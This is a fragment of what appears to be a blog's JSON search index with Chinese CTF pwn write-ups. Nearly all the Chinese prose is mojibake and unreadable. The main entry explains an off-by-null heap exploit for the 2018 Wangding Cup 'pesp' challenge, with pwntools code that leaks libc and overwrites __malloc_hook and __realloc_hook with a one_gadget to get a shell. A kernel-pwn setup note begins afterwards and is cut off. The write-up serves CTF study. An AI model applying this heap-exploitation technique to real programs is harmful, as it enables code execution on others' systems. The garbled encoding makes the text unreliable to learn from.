åˆæ³•sizeä½¿å¾—ç¨‹åºä¸ä¼šå´©æºƒã€‚è¿™é‡Œç”¨åˆ°çš„0x601ffaå°±æ˜¯è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°èƒ½ç”¨çš„ï¼Œå¹¶ä¸”è¿˜éœ€è¦å¡«å……0xeï¼Œä¹Ÿå°±æ˜¯14ä¸ªå­—èŠ‚ã€‚\n","tags":["overflow"],"categories":["PWN","pwnå †-overflow"]},{"title":"pesp_off-by-null","url":"/2021/08/14/pesp_off-by-null/","content":"\n1.è¿˜æ˜¯ä¹‹å‰çš„2018ç½‘é¼æ¯çš„pespé¢˜ç›®ã€‚è¿™é‡Œå‡è®¾æ²¡æœ‰å †æº¢å‡ºï¼Œæœ‰PIEä¿æŠ¤ï¼Œæ— æ³•åŠ«æŒgotè¡¨ã€‚åªä½¿ç”¨0å­—èŠ‚æº¢å‡ºæ¼æ´æ¥è·å–libcåœ°å€ï¼Œå†æ ¹æ®å¾—åˆ°çš„libcåœ°å€æ¥æ›´æ”¹malloc_hookå’Œrealloc_hooké‡Œé¢ä¿å­˜çš„åœ°å€ä¸ºone_gadgetï¼Œä¸€æ­¥getshellã€‚(realloc_hookä¸ºonegadgetï¼Œmalloc_hookä¸º__libc_reallocå‡½æ•°ä¸­è°ƒæ•´æ ˆå¸§çš„åœ°æ–¹)\n\n2.å…ˆæ¢³ç†ä¸€ä¸‹0å­—èŠ‚æº¢å‡ºæ¼æ´ï¼Œä¸€èˆ¬çš„chunkæ”¹å†…å®¹éƒ½æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nread(0, chunk_ptr, size);\n```\n\nè¿™æ ·å°±åªèƒ½è¾“å…¥sizeè¿™ä¹ˆå¤§çš„å†…å®¹ï¼Œä½†æ˜¯è¿™é“é¢˜ä¸­ï¼Œåœ¨addå‡½æ•°ä¸­å’Œchangeå‡½æ•°ä¸­ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg)\n\nå¯ä»¥çœ‹åˆ°ç»™chunkæ·»åŠ å†…å®¹çš„è¯­å¥éƒ½æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null\n```\n\nè¿™æ ·å½“æˆ‘ä»¬å°†chunkå†…å®¹é¡¶æ»¡ä¹‹åï¼Œç¨‹åºä¼šå°†chunkæŒ‡é’ˆæœ€åéƒ¨åˆ†å†æº¢å‡ºä¸€ä¸ªå­—èŠ‚èµ‹å€¼ä¸º0ï¼Œè¿™å°±æ˜¯off-by-nullã€‚\n\nç”±äºscanfå‡½æ•°ä¼šåœ¨æœ«å°¾è‡ªåŠ¨è¡¥\\x00ï¼Œè¿™å…¶å®ä¹Ÿæ˜¯ä¸€ç§off-by-nullï¼Œ\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf[10];\nscanf(\"10%s\",buf);\n```\n\n \n\nâ–²freeæºç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (!prev_inuse(p)) {\n    prevsize = p->prev_size;\n    size += prevsize;\n    p = chunk_at_offset(p, -((long ) prevsize));\n    unlink(av, p, bck, fwd);\n}\n```\n\nä¹Ÿå°±æ˜¯å¦‚æœå½“å‰chunkçš„IN_USEä½ä¸º0ï¼Œé‚£ä¹ˆå°±æ ¹æ®å½“å‰chunkçš„pre_sizeä½ï¼Œæ‰¾åˆ°å‰ä¸€ä¸ªchunk_preï¼Œå°†chunk_preçš„sizeä½æ”¹æˆsize+pre_sizeï¼Œé€šè¿‡Unlinkå–å‡ºchunk_preï¼Œå‡†å¤‡åˆå¹¶ã€‚(ä¹‹åçš„æ£€æŸ¥ä»£ç ä¼šå†å¾ªç¯ï¼Œä¹Ÿå°±æ˜¯å†çœ‹chunk_preçš„IN_USEä½æ˜¯ä¸æ˜¯0æ¥åˆ¤æ–­è¦ä¸è¦å†å‘ä¸Šåˆå¹¶ï¼Œè¿™é‡Œä¸é‡è¦)\n\næ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡off-by-nullï¼Œæº¢å‡º0åˆ°chunk_nextçš„sizeä½ä¸­çš„IN_USEä½ï¼Œé‚£ä¹ˆå½“å‰chunkå°±ä¼šè¢«æ ‡è®°ä¸ºFreeï¼Œè¿™æ ·åœ¨Free(chunk_next)æ—¶ï¼Œå°±ä¼šå°†chunkå’Œchunk_nextåˆå¹¶ã€‚å¦‚æœæˆ‘ä»¬åˆæ›´æ”¹äº†chunk_nextçš„pre_sizeä½ï¼Œä½¿å®ƒå˜å¾—æ›´å¤§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‘ä¸Šåˆå¹¶æ›´å¤§çš„chunkå—ã€‚è¿™å°±æ˜¯off-by-nullçš„åˆ©ç”¨æ–¹æ³•ï¼Œè¿™é¢˜ä¸­å¦‚ä¸‹ï¼š\n\n(éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæº¢å‡ºçš„æ˜¯ä¸€ä¸ªå­—èŠ‚è€Œä¸æ˜¯ä¸€ä¸ªBitï¼Œæ‰€ä»¥sizeä¸€èˆ¬éƒ½è®¾ç½®ä¸º0xf0ï¼Œä»è€Œä½¿sizeä½å˜æˆ0x101ï¼Œæº¢å‡ºä¹‹åè¿›è€Œå˜æˆ0x100ã€‚ä½†å¦‚æœsizeæœ€å¼€å§‹è®¾ç½®ä¸º0x20ï¼Œsizeä½å°±æ˜¯0x30ï¼Œæº¢å‡º0å­—èŠ‚å°±ä¼šå˜æˆ0x00ï¼Œé‚£æ ·ç¨‹åºç…§æ ·å´©æºƒã€‚)\n\n(1)å…ˆç”³è¯·å››ä¸ªchunkï¼Œåˆ†åˆ«ä¸ºchunk0,chunk1,chunk2,chunk3ã€‚(chunk3é˜²æ­¢åˆå¹¶ç”¨)\n\n(2)ç„¶åfreeæ‰chunk0ï¼Œ(è¿™é‡Œchunk0éœ€è¦è¶³å¤Ÿå¤§ï¼Œä¸€èˆ¬å¾—å¤§äº0x80ï¼Œä¹Ÿå°±æ˜¯MAX_fastbins)ï¼Œä½¿å…¶è¿›å…¥unsortedbinsä¸­ã€‚(è¿™é‡Œå¿…é¡»freeæ‰chunk0ï¼Œä¸ç„¶ä¹‹åä¿®æ”¹æ‰chunk2çš„pre_sizeä½æ—¶ï¼Œç„¶åfreeæ‰chunk2æ—¶ï¼Œç¨‹åºä¾æ®pre_sizeæ¥åˆ¤æ–­æ˜¯å¦åˆå¹¶æ—¶ï¼Œå‘ç°chunk0ä»æ—§å¤„äºä½¿ç”¨å½“ä¸­ï¼Œä½†pre_sizeåŒ…å«äº†chunk0ï¼Œå°±ä¼šé€ æˆç¨‹åºå´©æºƒ)\n\n(3)ä¿®æ”¹chunk1çš„æœ€åå…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯chunk2çš„pre_sizeä½ï¼Œä½¿å¾—chunk2çš„pre_sizeä½çš„å¤§å°ä¸ºchunk0_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk2ï¼Œä½¿å¾—chunk0,chunk1,chunk2ä¸‰ä¸ªchunkä½œä¸ºä¸€ä¸ªæ•´ä½“è¢«åˆå¹¶ä¹‹åæ”¾å…¥åˆ°unsortedbinsä¸­ï¼Œè°ƒè¯•è¿‡ç¨‹å¯ä»¥å‘ç°ï¼Œchunk0çš„sizeä½è¢«ä¿®æ”¹æˆäº†sizeof(chunk0+chunk1+chunk2)ã€‚ä½†æ˜¯è¿™é‡Œå®é™…æƒ…å†µä¸­ï¼Œchunk1å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œåªæ˜¯å®ƒçš„å†…å­˜å¤„åœ¨è¢«é‡Šæ”¾çš„å†…å­˜ä¸­é—´ï¼Œä¾ç„¶å¯ä»¥é€šè¿‡chunk1çš„æŒ‡é’ˆæ¥æ“ä½œã€‚ä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªç¨‹åºä¸­ä¾æ—§å¯ä»¥è¿›è¡Œeditæ¥ä¿®æ”¹chunk1ï¼Œæˆ–è€…showæ¥æ‰“å°chunk1ã€‚\n\n(5)å†æ¬¡ç”³è¯·chunk0å¤§å°ï¼Œè¿™æ ·å°±ä¼šå‰²è£‚unsortedbinsä¸­çš„remainderä¸ºchunk0+new_remainderï¼ŒæŠŠchunk0ç”³è¯·å›æ¥ï¼Œå‰©ä¸‹çš„new_remainderä¾æ—§æ”¾åœ¨unsortedbinsä¸­ã€‚åœ¨unsortedbinsä¸­çš„remainderæœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯è¯¥chunkçš„fdå’Œbkä¸€å®šæŒ‡å‘unsortedbinsé“¾è¡¨å¤´éƒ¨ï¼Œ(å¦‚æœæœ‰å¤šä¸ªremainderï¼Œé‚£ä¹ˆé¡ºåºç±»ä¼¼äºsmallbinsï¼Œä¾æ—§å¯ä»¥ä½¿ç”¨ç¬¬ä¸€ä¸ªchunkçš„bkæ¥è·å–unsortedbinsé“¾è¡¨å¤´éƒ¨)\n\n(6)é‚£ä¹ˆç°åœ¨unsortedbinsä¸­æœ‰chunk1å’Œchunk2ï¼Œè€Œchunk1çš„fdå’Œbkéƒ½æŒ‡å‘unsortedbinsé“¾è¡¨å¤´éƒ¨ï¼Œå¹¶ä¸”åœ¨ç¨‹åºä¸­chunk1ä»æ—§å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œfdå’Œbkå°±æ˜¯chunk1çš„dataéƒ¨åˆ†ã€‚æ‰€ä»¥showå‡½æ•°å°±å¯ä»¥æ‰“å°å‡ºchunk1çš„dataéƒ¨åˆ†ï¼Œä»è€Œæ‰“å°å‡ºfdå’ŒbkæŒ‡å‘çš„unsortedbinså¤´éƒ¨é“¾è¡¨åœ°å€ã€‚åˆç”±äºunsortedbinså¤„åœ¨main_arena+0x58ä½ç½®ï¼Œè€Œmain_arenaç›¸å¯¹äºlibcåŸºåœ°å€çš„åç§»æ˜¯å›ºå®šçš„ï¼Œä¸º0x3c4b20(ä¸åŒglibcç‰ˆæœ¬å¯èƒ½ä¸åŒï¼Œè¿™æ˜¯libc2.23çš„)ï¼Œæ‰€ä»¥è¿™ä¹Ÿå°±é—´æ¥æ³„éœ²å‡ºäº†libcåŸºåœ°å€ã€‚\n\nâ–²æŸ¥è¯¢main_arenaæ–¹æ³•ï¼š\n\nâ‘ å·¥å…·æŸ¥è¯¢ï¼šhttps://github.com/coldwave96/libcoffsetï¼š\n\nâ‘¡IDAæŸ¥è¯¢ï¼šmain_arenaå­˜å‚¨åœ¨libc.so.6æ–‡ä»¶çš„.dataæ®µï¼Œä½¿ç”¨IDAæ‰“å¼€libcæ–‡ä»¶ï¼Œç„¶åæœç´¢å‡½æ•°malloc_trim()\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg)\n\n \n\n3.ç°åœ¨æœ‰äº†libcåŸºåœ°å€ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±è€ƒè™‘ä¿®æ”¹mallo_hookå’Œrealloc_hookçš„å€¼ã€‚åŒæ ·ä½¿ç”¨0å­—èŠ‚æº¢å‡ºæ¼æ´ï¼Œä¼ªé€ fakechunkä¸ºmallo_hookåœ°å€ï¼Œä¿®æ”¹fakechunkä»è€Œä¿®æ”¹malloc_hookå’Œrealloc_hookã€‚è¿™é‡Œå…ˆå¿½ç•¥ä¸Šé¢çš„ï¼Œç¨‹åºä¸­çš„ç´¢å¼•ä¼šä¸å¤ªä¸€æ ·ã€‚æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š\n\n(1)å…ˆç”³è¯·ä¸€ä¸ªè¾ƒå¤§çš„chunkï¼Œé˜²æ­¢å’Œä¸Šé¢çš„åˆå¹¶\n\n(2)ä¹‹åçš„æ“ä½œæ–¹æ³•ç±»ä¼¼ï¼Œå…ˆç”³è¯·å››ä¸ªchunkï¼Œåˆ†åˆ«ä¸ºchunk0,chunk1,chunk2,chunk3ã€‚(chunk3é˜²æ­¢åˆå¹¶ç”¨)\n\n(3)freeæ‰chunk0ï¼Œä½¿å…¶è¿›å…¥unsortedbinsä¸­ã€‚ä¿®æ”¹chunk1çš„æœ€åå…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯chunk2çš„pre_sizeä½ï¼Œä½¿å¾—chunk2çš„pre_sizeä½çš„å¤§å°ä¸ºchunk0_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk2ï¼Œä½¿å¾—chunk0,chunk1,chunk2ä¸‰ä¸ªchunkä½œä¸ºä¸€ä¸ªæ•´ä½“è¢«åˆå¹¶ä¹‹åæ”¾å…¥åˆ°unsortedbinsä¸­ã€‚å†freeæ‰chunk1ï¼Œä½¿å…¶è¿›å…¥fastbinsä¸­ã€‚è¿™æ ·chunk1å³åœ¨fastbinsä¸­ï¼Œä¹Ÿå¤„åœ¨unsortedbinsä¸­ã€‚\n\n(5)ç”³è¯·ä¸€ä¸ªç‰¹æ®Šå¤§å°çš„chunkå—ï¼Œæœ€å°ä¸ºchunk0_size+0x20ï¼Œä½¿å…¶çš„dataéƒ¨åˆ†è¶³å¤Ÿå¤§ï¼Œèƒ½å¤Ÿä¿®æ”¹æ‰chunk1çš„fdä½ï¼Œå°†chunk1çš„fdä½æŒ‡å‘fakechunkï¼Œç”±äºéœ€è¦ä»sizeä½è¦†ç›–åˆ°fdï¼Œæ‰€ä»¥éœ€è¦ä¼ªé€ åˆæ³•çš„sizeï¼Œä¸ºchunk1_sizeã€‚\n\n(6)ç”³è¯·ä¸¤ä¸ªchunk1å¤§å°çš„chunk_aï¼Œchunk_bï¼Œè¿™æ ·ç¬¬ä¸€æ¬¡ç”³è¯·çš„chunk_aå°±æ˜¯ä»fastbinsä¸­å›æ¥çš„chunk1ã€‚è€Œchunk_bå°±æ˜¯chunk1çš„fdæŒ‡å‘çš„fakechunkã€‚è¿™æ ·å¦‚æœå°†fakechunkæ”¾åœ¨realloc_hookä¹‹å‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹æ‰realloc_hookå’Œmalloc_hookï¼Œä½¿å¾—realloc_hookæŒ‡å‘one_gadgetï¼Œè€Œmalloc_hookæŒ‡å‘__libc_libcå‡½æ•°ä¸­çš„æŸä¸ªå¯ä»¥æ§åˆ¶æ ˆå¸§çš„åœ°å€ï¼Œä»è€Œæ»¡è¶³gadgetæ¡ä»¶æ¥getshellã€‚\n\n4.å¼€å§‹ç¼–å†™expï¼Œå¢åˆ æ”¹æŸ¥å‡½æ•°å°±ä¸è¯´äº†:\n\n(1)è·å–libcåŸºåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0xf0,'0'*0xf0)\nadd(0x68,'1'*0x68)#trigger 0ff-by-null\nadd(0xf0,'2'*0xf0)\nadd(0x10,'3'*0x10)\n#chunk0,chunk1,chunk2,chunk3(é˜²æ­¢åˆå¹¶)\n\ndelete(0)#é˜²æ­¢ç¨‹åºå´©æºƒ\nedit(1,0x68,flat('1'*0x60,0x170))\n#ä¿®æ”¹chunk2çš„pre_sizeï¼Œä½¿å¾—chunk0,chunk1,chunk3æ‰‹ç‰µæ‰‹è¿›å…¥unsortedbinsä¸­\ndelete(2)\n#è§¦å‘chunk2çš„pre_sizeä½œç”¨\n\n#å…³é”®å°±åœ¨è¿™ä¸ªaddï¼Œç›®çš„å°±æ˜¯å°†unsortedbinsçš„é“¾è¡¨å¤´éƒ¨æ”¾åˆ°chunk1çš„fdå’Œbkä½\nadd(0xf0,'x'*0x10)\n\n#ç°åœ¨å°±å¯ä»¥æ‰“å°chunk1æ¥è·å–unsortedbinsé“¾è¡¨çš„å¤´éƒ¨åœ°å€ï¼Œä»è€Œè®¡ç®—å¾—åˆ°libcåœ°å€\nshow()\nlibc_address = u64(io.recvuntil(\"\\x7f\")[-6: ]+'\\0\\0')-0x3c4b78\nprint(\"libc @ {:#x}\".format(libc_address))\n```\n\n(2)ä¼ªé€ fakechunkï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x160,'4'*0x160)\n#ç¬¬ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶åŠ ç¨‹åºå´©æºƒ\n\nadd(0xf0,'a'*0xf0)\nadd(0x68,'b'*0x68)\nadd(0xf0,'c'*0xf0)\nadd(0x10,'d'*0x10)\n#å››ä¸ªchunkï¼Œå¥—è·¯ä¸€æ ·ã€‚ç”±äºç¨‹åºç¼–å†™åŸå› ï¼Œæ‰€ä»¥ç´¢å¼•å˜æˆchunk4,chunk5,chunk6,chunk7,å¯¹åº”ä¸Šé¢çš„chunk0,chunk1,chunk2,chunk3ã€‚\n\n\ndelete(4)#é˜²æ­¢ç¨‹åºå´©æºƒ\nedit(5,0x68,flat('b'*0x60,0x170))\n#ä¿®æ”¹chunk2çš„pre_sizeï¼Œä½¿å¾—chunk0,chunk1,chunk3æ‰‹ç‰µæ‰‹è¿›å…¥unsortedbinsä¸­\ndelete(6)\n#è§¦å‘chunk6çš„pre_sizeä½œç”¨\n\ndelete(5)\nadd(0x120,flat('A'*0xf8,0x70,(libc_address+0x3c4aed)))\n#ä½¿å¾—chunk5è¿›å…¥fastbinsï¼Œä¹‹åä¿®æ”¹å…¶fdä½ï¼Œåˆ›é€ ä¸€ä¸ªfakechunkè¿›å…¥fastbinsã€‚è¿™é‡Œçš„fakechunk_addrå°±æ˜¯libc_address+0x3c4aedã€‚è¿™é‡Œçš„0x70å†™æˆ0x71ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºä¹‹åæ˜¯mallocï¼Œä¸ä¼šç®¡chunkçš„IN_USEä½ï¼Œä¹Ÿå°±æ˜¯Pä½ã€‚\n```\n\n(3)ç”³è¯·è·å¾—fakechunkï¼ŒåŒæ—¶ä¿®æ”¹è¯¥fakechunkï¼ŒåŠ«æŒmalloc_hookå’Œrealloc_hookã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x68,'x'*0x10)\nadd(0x68,flat('\\0'*11,(libc_address+one_gadget),(libc_address+16+libc.sym[\"__libc_realloc\"])))\n```\n\n(4)éšä¾¿ç”³è¯·ä¸€ä¸ªchunkå³å¯getshellï¼Œä½†æ˜¯è¿™é‡Œä¸è¦ä½¿ç”¨ä¹‹å‰æˆ‘ä»¬å®šä¹‰çš„addå‡½æ•°ï¼Œå› ä¸ºç¨‹åºä¸€æ—¦call mallocå³å¯getshellï¼Œå³è¿è¡Œåˆ°è¾“å…¥é•¿åº¦å³å¯ï¼Œä½†æ˜¯æˆ‘ä»¬çš„addå‡½æ•°ä¸­ä¸€ç›´è¿è¡Œåˆ°è¾“å…¥å†…å®¹æ‰ç»“æŸï¼Œä¼šå¯¼è‡´ç¨‹åºå¡ä½ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nio.sendlineafter(\"choice:\",\"2\")\nio.sendlineafter(\":\",\"anything\")\n\nio.interactive()\n```\n\n5.è¿™é‡Œéœ€è¦å¾ˆå¤šè°ƒè¯•çš„æ­¥éª¤ï¼š\n\n(1)ä»æœ€å¼€å§‹æ‰“ç®—ä¼ªé€ fakechunkæ—¶å°±åº”è¯¥çŸ¥é“æˆ‘ä»¬çš„chunkå¤§å°åº”è¯¥è®¾ç½®ä¸º0x68ï¼Œå› ä¸ºç¨‹åºè·‘èµ·æ¥æ˜¯0x7få¼€å¤´ï¼Œæ‹¿æ¥ä¼ªé€ sizeå†åˆé€‚ä¸è¿‡ï¼Œè¿™æ ·çš„chunkå¤§å°æ˜¯0x70ã€‚è€Œæˆ‘ä»¬åˆåªèƒ½ç”¨0å­—èŠ‚æº¢å‡ºï¼Œæ‰€ä»¥éœ€è¦å°†chunkè®¾ç½®åˆ°æœ€å¤§ï¼Œä¹Ÿå°±æ˜¯0x70-0x08ã€‚\n\n(2)è€Œ0xf0å¯ä»¥æ”¹å˜ï¼Œåªè¦æ¯”fastbins_MAXå¤§å°±è¡Œï¼Œé‚£ä¹ˆå¯¹åº”çš„0x170ä¹Ÿéœ€è¦æ”¹å˜ï¼ŒåŒæ—¶ä¹Ÿè¦æ”¹å˜0x120ã€‚\n\n(3)ç”³è¯·fakechunkæ­¥éª¤ä¸­çš„'\\0'*11ä¹Ÿæ˜¯éœ€è¦é€šè¿‡è°ƒè¯•ç®—å‡ºæ¥ï¼Œæ–¹æ³•å°±æ˜¯gdbæŸ¥çœ‹realloc_hook-0xxxé™„è¿‘çš„å†…å­˜ï¼Œé€‰æ‹©åˆé€‚çš„å¯ä»¥ä¼ªé€ sizeçš„åœ°å€ï¼Œä¹‹åé€šè¿‡å¡«å……paddingæ¥è¦†ç›–realloc_hookå’Œmalloc_hookã€‚\n\n(4)onegadgetç›¸å…³çš„+16ä¹Ÿå¾—é€šè¿‡è°ƒè¯•æ‰èƒ½çŸ¥é“ï¼Œè¿™é‡Œé€‰å–çš„onegadgetæ¡ä»¶æ˜¯[rsp+0x30]==Nullã€‚æ‰€ä»¥è°ƒè¯•æ—¶å°†æ–­ç‚¹ä¸‹åœ¨__libc_reallocå‡½æ•°ä¸Šï¼Œè¿›å…¥__libc_reallocå‡½æ•°ï¼Œä»è€Œä¸€ç›´è¿›å…¥åˆ°onegadgetçš„æ‰§è¡Œä»£ç ä¸­ï¼Œå¦‚ä¸‹ï¼š\n\nå…ˆä¸‹æ–­ç‚¹è®©ç¨‹åºè¿è¡Œåˆ°è¿™![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg)\n\nå†è¾“å…¥niè¿›å…¥:![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg)\n\nè¿™æ—¶å€™å°±å¯ä»¥çœ‹rspçš„å€¼äº†ï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg)\n\nè¿™é‡Œçš„rspæ˜¯0x7ffca3331eb8ï¼Œrsp+0x30=0x7ffca3331ee8ï¼Œå¯¹åº”å›¾ä¸­çš„å€¼å°±å¾—æ˜¯0æ‰æ»¡è¶³æ¡ä»¶(è¿™é‡Œå·²ç»è®¡ç®—è¿‡äº†ï¼Œ+16)\n\nâ–²å¦‚æœä»æœ€å¼€å§‹è¿›å…¥__libc_reallocå‡½æ•°ï¼Œè¿›å…¥åˆ°onegadgetä¸­ä¹‹åï¼Œå‘ç°æ¡ä»¶ä¸æ»¡è¶³ï¼Œé‚£ä¹ˆéœ€è¦è§‚å¯Ÿå‰åçš„å€¼ï¼Œä»è€Œå†³å®šä»å“ªé‡Œè¿›å…¥__libc_reallocå‡½æ•°æ‰èƒ½ä½¿å¾—rspæ»¡è¶³ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg)\n\nå› ä¸º__libc_realloc(å°±æ˜¯realloc)å‡½æ•°æœ‰ä¸€å †çš„pushå’Œsubæ“ä½œï¼Œå°‘ä¸€ä¸ªpushï¼Œé‚£ä¹ˆrspå°±å¯ä»¥ä¸‹æŒª0x08ï¼Œç›¸å½“äºrsp+0x08ï¼Œä¸­é—´è¿˜æœ‰sub rsp,xxhï¼Œç›¸å½“äºä¸ŠæŒªrspã€‚æ‰€ä»¥å†³å®šä»å“ªé‡Œè¿›å…¥reallocå‡½æ•°å†³å®šäº†onegadgetçš„æˆåŠŸä¸å¦ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg)\n\nè€Œé€šè¿‡æ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œå®é™…çš„onegagetæ˜¯é€šè¿‡0x84724 mov rax,cs:__realloc_hook_pträ¼ è¿›æ¥ï¼Œä¹‹åç”±äº\n\n```\n#æ³¨é‡Šå¤´\n\ntest rax rax\njnz  loc_84958\n```\n\nraxä¸ä¸º0ï¼Œå¿…å®šè·³è½¬loc_84958:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg)\n\nè¿™é‡Œæ‰æ˜¯æˆ‘ä»¬é€‰æ‹©è°ƒç”¨è¿›å…¥onegadgetçš„å…¥å£ã€‚æ‰€ä»¥ä¹‹å‰åœ¨__libc_reallocçš„è®¡ç®—éƒ½æ˜¯ä¸ºäº†è°ƒæ•´æ ˆå¸§ï¼Œä¸ç„¶å…¶å®å¦‚æœæ ˆå¸§ä¸ç”¨è°ƒæ•´å°±å¯ä»¥æ»¡è¶³ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†malloc_hookæ”¹æˆonegadgetä¹Ÿå¯ä»¥ç›´æ¥getshellã€‚å› ä¸º__libc_mallocå‡½æ•°ä¸­çš„æ±‡ç¼–ä»£ç ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg)\n\nè€Œä¸”è¿™è¿˜æ˜¯ä¸€ä¸ªæ— æ¡ä»¶è·³è½¬ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg)\n\nå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªpush,ä¸€ä¸ªsub rsp,8;ä¸¤ä¸ªPopã€‚ç›¸å½“äºåªè¦åœ¨call mallocä¹‹å‰ï¼Œæˆ‘ä»¬çš„rsp+0x28==NULLå³å¯æ»¡è¶³onegadgetçš„rsp+0x30==NULLçš„æ¡ä»¶ã€‚å½“ç„¶ï¼Œä»¥ä¸Šåªæ˜¯åœ¨Libc2.23ä¸‹çš„ï¼Œå¦‚æœæ˜¯å…¶å®ƒç‰ˆæœ¬çš„libcå°±å¯èƒ½ä¸å¤ªä¸€æ ·ã€‚\n\n \n\n \n","tags":["off-by-null"],"categories":["PWN","pwnå †-off-by-null"]},{"title":"pwn-kernel_åšé¢˜çŸ¥è¯†","url":"/2021/08/14/pwn-kernel_åšé¢˜çŸ¥è¯†/","content":"\nä¸€ã€é¢˜ç›®ç»™çš„æ–‡ä»¶ï¼š\n\n1.bzImageï¼šå°±æ˜¯linuxç¼–è¯‘åçš„è¿è¡Œå†…æ ¸ï¼Œåœ¨å¯åŠ¨å‚æ•°ä¸­è®¾ç½®å³å¯ã€‚\n\n2.file.cpioï¼šé¢˜ç›®ç»™çš„ï¼Œæœ‰çš„å¯ä»¥ç›´æ¥ç”¨qemuå¯åŠ¨è¿è¡Œï¼Œä½†æ˜¯æœ‰çš„éœ€è¦è§£å‹åå†æ‰“åŒ…ï¼Œå…·ä½“çœ‹é¢˜ç›®ã€‚\n\n3.xx.shæ–‡ä»¶:å¯åŠ¨æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«ä»£è¡¨qemuå¯åŠ¨æ—¶çš„å„ç§å‚æ•°ï¼š\n\n(1)qemu-system-x86_64ï¼šæ¶æ„\n\n(2)-mï¼šè®¾ç½®è¿è¡Œå†…å­˜ã€‚\n\n-m 64M\n\n-m 128M....\n\n(3)-kernelï¼šè®¾ç½®è¿è¡Œçš„å†…æ ¸ï¼Œä¸€èˆ¬é¢˜ç›®ä¼šç»™ï¼Œè‡ªå·±ä¹Ÿå¯ä»¥å» [www.kernel.org](http://www.kernel.org) æ¥ä¸‹è½½ç¼–è¯‘å†…æ ¸ã€‚\n\n-kernel bzImage\n\n(4)-initrdï¼šè®¾ç½®åˆå§‹åŒ–çš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œå°±æ˜¯.cpioæ–‡ä»¶ï¼Œé¢˜ç›®ç»™çš„å¯èƒ½æœ‰é™·é˜±ä»€ä¹ˆçš„ï¼Œä¸€èˆ¬æˆ‘ä»¬éœ€è¦è§£å‹ç„¶åçœ‹çœ‹å…¶ä¸­çš„initæ˜¯ä¸æ˜¯æœ‰äº›å¹²æ‰°ä¸œè¥¿ã€‚\n\nä¾‹å¦‚poweroff -d 120 -f & è¿™è¡Œä»£ç å°±ä»£è¡¨å®šæ—¶å…³æœºï¼Œè¿™å°±éœ€è¦å»æ‰ï¼Œå»æ‰å¯èƒ½çš„å¹²æ‰°åå°±å†æ‰“åŒ…ï¼Œé‡æ–°ç”Ÿæˆ.cpioæ–‡ä»¶ï¼Œç„¶åé€šè¿‡./xx.shå¯åŠ¨\n\nâ‘ è§£å‹ï¼š\n\nmkdir file\n\ncd file\n\ncpio -idm < ./core.cpio  //å†æ¬¡è§£å‹\n\n```\n#æ³¨é‡Šå¤´\n\nmv ../file.cpio file.cpio.gz  //æ”¹åï¼Œæ–¹ä¾¿gunzipè¯†åˆ«æ ¼å¼\ngunzip ./file.cpio.gz     //è§£å‹\n#å¦‚æœæ˜¯æ­£å¸¸cpioæ‰“åŒ…åˆ™ä¸éœ€è¦ï¼Œä½†æ˜¯æœ‰çš„é¢˜ç›®å°±ä¼šæœ‰ç”¨Gunzipå‹ç¼©ä¹‹åå†cpioæ‰“åŒ…ã€‚\n```\n\nç„¶ååˆ é™¤file.cpioæ–‡ä»¶ï¼Œæ²¡å•¥ç”¨äº†ï¼Œé‚£ä¹ˆç°åœ¨çš„ç›®å½•ä¸‹çš„æ–‡ä»¶å¦‚æœå†æ‰“åŒ…ç”Ÿæˆcpioæ–‡ä»¶å°±ä¼šæ˜¯qemuåŠ è½½ä¹‹åçš„æ ¹ç›®å½•æ–‡ä»¶ç³»ç»Ÿäº†ã€‚\n\n-initrd ./core.cpio\n\nâ‘¡æ‰“åŒ…ï¼š\n\nåˆ‡æ¢åˆ°æ 